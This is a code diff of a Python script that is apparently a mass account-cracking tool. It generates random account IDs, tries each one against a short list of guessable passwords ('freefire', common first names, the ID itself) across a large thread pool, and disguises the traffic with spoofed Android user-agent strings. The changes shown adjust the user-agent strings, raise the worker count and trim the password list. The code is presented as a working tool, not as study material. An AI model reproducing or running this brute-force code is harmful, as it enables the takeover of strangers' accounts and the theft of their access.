@@ -59,13 +59,13 @@ ugen = []
 #--------USER-AGENTS------#
 ugen=[]
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 10; K)'
+        aa='Dalvik/2.1.0 (Linux; U; Android 9; Redmi S2 MIUI/V12.0.2.0.PEFMIXM)'
         b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 10; K'
+        c='Android 9; Redmi S2 MIUI/V12.0.2.0.PEFMIXM'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0'
+        g='AppleWebKit [PB/107]'
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
@@ -134,7 +134,7 @@ def MUHIBrndm():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=100) as MUHIB:
+    with ThreadPool(max_workers=101) as MUHIB:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -150,7 +150,7 @@ def MUHIBrndm():
         __muhib__('\033[38;5;46m--------------------------------------------')
         for guru in user:
             uid = tithie+tithiex+tithi+guru
-            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
+            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@#@#@#','jannat','sadiya','tamanna','nusrat']
             MUHIB.submit(rcrack1,uid,pwx,tl)
     print(f'{G}--------------------------------------')
     print(' [×] FINISHED ------\033[1;92mTOTAL OK : %s'%len(oks))
